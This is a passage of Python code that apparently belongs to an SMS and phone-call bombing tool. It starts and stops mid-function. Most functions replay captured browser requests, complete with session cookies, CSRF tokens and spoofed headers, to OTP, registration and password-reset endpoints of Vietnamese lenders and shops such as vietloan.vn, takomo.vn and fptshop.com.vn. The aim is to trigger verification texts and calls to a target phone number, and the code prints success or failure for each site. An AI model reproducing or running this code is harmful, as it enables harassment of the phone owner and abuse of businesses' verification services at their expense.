    # 'cookie': '.Nop.Customer=f9bb8ede-b5ea-4308-af9c-88e22280c9bc; .Nop.Antiforgery=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdcffEk-3k7IgQGiV5vn7OWCFbFCyk8NnbW3by8yQ5XlUzoc9uMvmKJZXwh7wbCV1SGAZxqdPWJrnLjB-JsGJJBByRu5oSQ3qREPbEM8_J4AeB0KiOIN6KbvUYFVgBb6Us',
  }
  params = {
    'returnurl': '/pizza',
  }
  data = 'FirstName=Lo+Lon&Username=sdt&Email=HShshshs%40gmail.com&Password=1233cc&ConfirmPassword=1233cc&AcceptPrivacyPolicy=true&register-button=&__RequestVerificationToken=CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdrlLMrud6K3IHdSZxUUIGNBmPu2NHdtR6SHPq_OLXvUCmZmeWlARmF_2QZrZj47-6QIO-HDXbRp9ajdWrDab0qxf_OnqKrr3x3qt6z8rkmVhekg8Mczlgb6nHQVjo5Omc&AcceptPrivacyPolicy=false'.replace("sdt",sdt)
  response = requests.post('https://thepizzacompany.vn/register', params=params, headers=headers, data=data)
  if response.status_code == 200:
      print(format_print("*", "thepizzacompany: THÀNH CÔNG!"))
  else:
      print(format_print("x", "thepizzacompany: THẤT BẠI!"))   








# OTHER PART 

########################################################################
def call2(phone):
    cookies = {
        '__cfruid': '63a37bafdcd9829166465852342b434e3776b4ae-1703855095',
        '_gcl_au': '1.1.727757230.1703855098',
        '_fbp': 'fb.1.1703855098188.1238484689',
        '_gid': 'GA1.2.749926425.1703855098',
        '_clck': '15quhef%7C2%7Cfhy%7C0%7C1458',
        'mousestats_vi': '052f0ae63e6cd789411c',
        'mousestats_si': 'd7e0d3d9c561f50ecd34',
        '_tt_enable_cookie': '1',
        '_ttp': 's-4nP6sF0_lgurBLCF1B-v21xWI',
        '_ym_uid': '1703855103588718017',
        '_ym_d': '1703855103',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        'jslbrc': 'w.20231229130514e7ecb828-a64a-11ee-895c-3ef70195ea5e.A_GS',
        'XSRF-TOKEN': 'eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IlcvNEJKSHZabXZzaE5sWHdDcy9wVlE9PSIsInZhbHVlIjoidkRaWE9nR3AzOHJKZHo4am5TOE1XU1lvb2RyeGczQzExOFRDZzhhWVZSZ0E1MW5oT2JXQU1kYllRSFRCN2Y3VS9kU2F6U3BVVm5NQ3JhaURIVTdkd2FjWXBBU0ZVckZJQXpPczc5eTA0U2gxZXRkUHBmd04zdDdZeDdRMm9xUnEiLCJtYWMiOiI5OGNkMDNjMmQ1MDJlYTRmMDc0YTVlMGE4NmFhYjdkZDI5ODZkZjYzZjFmYmU4MDc1YjIwMmFmYzliZDkwNmY2IiwidGFnIjoiIn0%3D',
        '_ga_EBK41LH7H5': 'GS1.1.1703855098.1.1.1703855134.24.0.0',
        '_ga': 'GA1.2.471021909.1703855098',
        'ec_cache_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        '_clsk': 'g7wdb4%7C1703855136127%7C4%7C1%7Cp.clarity.ms%2Fcollect',
        'uid': '81c4b696-a147-509d-1759-988edae7b0b9',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'authority': 'vietloan.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=63a37bafdcd9829166465852342b434e3776b4ae-1703855095; _gcl_au=1.1.727757230.1703855098; _fbp=fb.1.1703855098188.1238484689; _gid=GA1.2.749926425.1703855098; _clck=15quhef%7C2%7Cfhy%7C0%7C1458; mousestats_vi=052f0ae63e6cd789411c; mousestats_si=d7e0d3d9c561f50ecd34; _tt_enable_cookie=1; _ttp=s-4nP6sF0_lgurBLCF1B-v21xWI; _ym_uid=1703855103588718017; _ym_d=1703855103; _ym_isad=2; _ym_visorc=w; jslbrc=w.20231229130514e7ecb828-a64a-11ee-895c-3ef70195ea5e.A_GS; XSRF-TOKEN=eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlcvNEJKSHZabXZzaE5sWHdDcy9wVlE9PSIsInZhbHVlIjoidkRaWE9nR3AzOHJKZHo4am5TOE1XU1lvb2RyeGczQzExOFRDZzhhWVZSZ0E1MW5oT2JXQU1kYllRSFRCN2Y3VS9kU2F6U3BVVm5NQ3JhaURIVTdkd2FjWXBBU0ZVckZJQXpPczc5eTA0U2gxZXRkUHBmd04zdDdZeDdRMm9xUnEiLCJtYWMiOiI5OGNkMDNjMmQ1MDJlYTRmMDc0YTVlMGE4NmFhYjdkZDI5ODZkZjYzZjFmYmU4MDc1YjIwMmFmYzliZDkwNmY2IiwidGFnIjoiIn0%3D; _ga_EBK41LH7H5=GS1.1.1703855098.1.1.1703855134.24.0.0; _ga=GA1.2.471021909.1703855098; ec_cache_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_etag_client=false; ec_etag_client_utm=null; _clsk=g7wdb4%7C1703855136127%7C4%7C1%7Cp.clarity.ms%2Fcollect; uid=81c4b696-a147-509d-1759-988edae7b0b9; client=false; client_utm=null',
        'dnt': '1',
        'origin': 'https://vietloan.vn',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '_token': 'LzSrVTbPGjnooEq6rDJnTv6FgLJs2MLlGIZxXwka',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
    if 'success' in response.text:
        print(format_print("*", "call2: THÀNH CÔNG!"))
    else:
        print(format_print("x", "call2: THẤT BẠI!"))   
        
#sms
def call3(phone):
    headers = {
        'Host': 'api.kimungvay.co',
        # 'content-length': '73',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.kimungvay.site',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.kimungvay.site/',
        # 'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': f'{phone}',
        'type': '2',
        'ctype': '1',
        'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
    }
    response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data)
    if 'successfully' in response.text:
      print(format_print("*", "call3: THÀNH CÔNG!"))
    else:
      print(format_print("x", "call3: THẤT BẠI!"))   
      
      
def call4(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'f-P_yvdwOUkXHDWa-KFeVqOb4Wi',
        '_fw_crm_v': 'e52ba209-a5c6-4321-a346-6e6a67dec047',
        '_hjSessionUser_2281843': 'eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSessionUser_2281853': 'eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_ZN0EBP68G5': 'GS1.1.1698416121.3.0.1698416121.60.0.0',
        '_ga': 'GA1.2.1930964821.1697294026',
        '_gid': 'GA1.2.1622182646.1703856647',
        '_gat_UA-187725374-2': '1',
        '_fbp': 'fb.1.1703856648592.667258868',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==',
        '_ga_2SRP4BGEXD': 'GS1.1.1703856646.1.0.1703856651.55.0.0',
        '_ga_ZBQ18M247M': 'GS1.1.1703856646.3.0.1703856651.55.0.0',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE',
        '_gcl_au': '1.1.1700522238.1697294026.14100726.1703856654.1703856653',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=f-P_yvdwOUkXHDWa-KFeVqOb4Wi; _fw_crm_v=e52ba209-a5c6-4321-a346-6e6a67dec047; _hjSessionUser_2281843=eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==; _hjSessionUser_2281853=eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==; _ga_ZN0EBP68G5=GS1.1.1698416121.3.0.1698416121.60.0.0; _ga=GA1.2.1930964821.1697294026; _gid=GA1.2.1622182646.1703856647; _gat_UA-187725374-2=1; _fbp=fb.1.1703856648592.667258868; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==; _ga_2SRP4BGEXD=GS1.1.1703856646.1.0.1703856651.55.0.0; _ga_ZBQ18M247M=GS1.1.1703856646.3.0.1703856651.55.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE; _gcl_au=1.1.1700522238.1697294026.14100726.1703856654.1703856653',
        'dnt': '1',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone='+phone+'&amount=2000000&term=7&utm_source=direct_takomo&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_submit',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'send',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
    if 'ok' in response.text:
        print(format_print("*", "call4: THÀNH CÔNG!"))
    else:
        print(format_print("x", "call4: THẤT BẠI!"))   
        
        
def call5(phone):
    cookies = {
        '_gid': 'GA1.2.639248556.1703855363',
        '_gac_UA-214880719-1': '1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1703934458.2.1.1703934534.44.0.0',
        '_ga': 'GA1.2.1290509617.1703855363',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.639248556.1703855363; _gac_UA-214880719-1=1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1703934458.2.1.1703934534.44.0.0; _ga=GA1.2.1290509617.1703855363',
        'dnt': '1',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': '84' + phone[1:9],
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if "call" in response.text:
        print(format_print("*", "call5: THÀNH CÔNG!"))
    else:
        print(format_print("x", "call5: THẤT BẠI!"))   
        
        
def call6(phone):
    cookies = {
        'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
    }

    headers = {
        'Host': 'h5.vivohan.com',
        'Connection': 'keep-alive',
        # 'Content-Length': '337',
        'system': 'android',
        'appcodename': 'Mozilla',
        'deviceType': 'h5',
        'screenresolution': '1080,1920',
        'appname': 'Netscape',
        'channel': 'e242',
        'w': '1080',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Content-Language': 'vn',
        'Accept': 'application/json, text/plain, */*',
        'platform': 'Linux i686',
        'vendor': 'Google Inc.',
        'Content-Type': 'application/json;charset=UTF-8',
        'h': '1920',
        'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Origin': 'https://h5.vivohan.com',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://h5.vivohan.com/login',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'Cookie': 'JSESSIONID=D15C9181DF236AE13B2AD4DFC7F826EB',
    }

    data = {
        'phone': phone,
        'type': 2,
        'timestamp': 1703951639000,
        'referrer': 'utm_source=e242',
        'af_prt': 'e242',
        'sign': '0f656af82eb1da33221a06d1171db265',
        'appversion': '1.0.0',
        'channel': 1,
        'app_version': '1.0.0',
        'version': '1.0.0',
        'imei': 'f30c673736f5301bd94aaaad5b543d90',
        'uuid': 'f30c673736f5301bd94aaaad5b543d90',
        'pkg_name': 'com.qcvivo.vivohanh5',
    }
    response = requests.post('https://h5.vivohan.com/api/register/app/sendSms', cookies=cookies, headers=headers, data=data)
    print(format_print("*", "call6: THÀNH CÔNG!"))
    
    
def call7(phone):
    headers = {
        'authority': 'api.itaphoa.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'dnt': '1',
        'origin': 'https://shop.mioapp.vn',
        'referer': 'https://shop.mioapp.vn/',
        'region-code': 'HCM',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
    }

    params = {
        'phone': phone,
        'type': 'call',
    }

    response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers)
    if 'true' in response.text:
        print(format_print("*", "call7: THÀNH CÔNG!"))
    else:
        print(format_print("x", "call7: THẤT BẠI!"))   
        
        
#sms 0
def sms0(phone):
    cookies = {
        'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
        'tel': phone,
    }

    headers = {
        'Host': 'kavaycash.com',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://kavaycash.com/',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'Cookie': 'csrftoken=jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7; tel=0357497741',
    }

    response = requests.get('https://kavaycash.com/verification/', cookies=cookies, headers=headers)
    print(format_print("*", "sms0: THÀNH CÔNG!"))
    
    
#sms 1
def sms1(phone):
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'UrWHpav-jlIIAkZIKfuHiWzvo3q',
        '_ym_uid': '1690890718761379945',
        '_ym_d': '1693615052',
        '_fbp': 'fb.1.1699102383332.1544435954',
        '_gcl_aw': 'GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
        '_gcl_au': '1.1.667368353.1703856886',
        '_ga_P2783EHVX2': 'GS1.1.1703856890.5.0.1703856890.60.0.0',
        '_ym_isad': '1',
        '_ga': 'GA1.2.1456721416.1693615049',
        '_gid': 'GA1.2.84320069.1703856892',
        '_gac_UA-151110385-1': '1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
        '_ym_visorc': 'w',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=UrWHpav-jlIIAkZIKfuHiWzvo3q; _ym_uid=1690890718761379945; _ym_d=1693615052; _fbp=fb.1.1699102383332.1544435954; _gcl_aw=GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _gcl_au=1.1.667368353.1703856886; _ga_P2783EHVX2=GS1.1.1703856890.5.0.1703856890.60.0.0; _ym_isad=1; _ga=GA1.2.1456721416.1693615049; _gid=GA1.2.84320069.1703856892; _gac_UA-151110385-1=1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _ym_visorc=w',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'login': phone,
        'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
    if "true" in response.text:
        print(format_print("*", "sms1: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms1: THẤT BẠI!"))   
        
        
#sms 2
def sms2(phone):
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '49eb18d9-d110-4043-8ad4-7275d8b8d2e7',
        '_gcl_au': '1.1.810434433.1689606249',
        'fpt_uuid': '%226a6dc316-0db3-44a0-8891-224623887942%22',
        'ajs_group_id': 'null',
        '_tt_enable_cookie': '1',
        '_ttp': '8uDshq4oYRcpPmQFUdKlNsoewGP',
        '__admUTMtime': '1689606251',
        '__uidac': '9d45aa00b705e4c9ff20708ca0955e4f',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '_gid': 'GA1.3.1682465247.1691155413',
        '_gat': '1',
        '_ga': 'GA1.1.1211624965.1689606248',
        'vMobile': '1',
        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1',
        'cf_clearance': 'm4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422',
        '_hjSessionUser_731679': 'eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=',
        '_ga_ZR815NQ85K': 'GS1.1.1691155413.2.0.1691155423.50.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=49eb18d9-d110-4043-8ad4-7275d8b8d2e7; _gcl_au=1.1.810434433.1689606249; fpt_uuid=%226a6dc316-0db3-44a0-8891-224623887942%22; ajs_group_id=null; _tt_enable_cookie=1; _ttp=8uDshq4oYRcpPmQFUdKlNsoewGP; __admUTMtime=1689606251; __uidac=9d45aa00b705e4c9ff20708ca0955e4f; __iid=; __iid=; __su=0; __su=0; _gid=GA1.3.1682465247.1691155413; _gat=1; _ga=GA1.1.1211624965.1689606248; vMobile=1; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1; cf_clearance=m4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422; _hjSessionUser_731679=eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=; _ga_ZR815NQ85K=GS1.1.1691155413.2.0.1691155423.50.0.0',
        'DNT': '1',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
    if '"error":false,'in response.text:
        print(format_print("*", "sms2: THÀNH CÔNG!"))
    else:
        print(format_print("x", "sms2: THẤT BẠI!"))   
        
        
#sms 3
def sms3(phone):
    headers = {
        'authority': 'kingme.pro',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
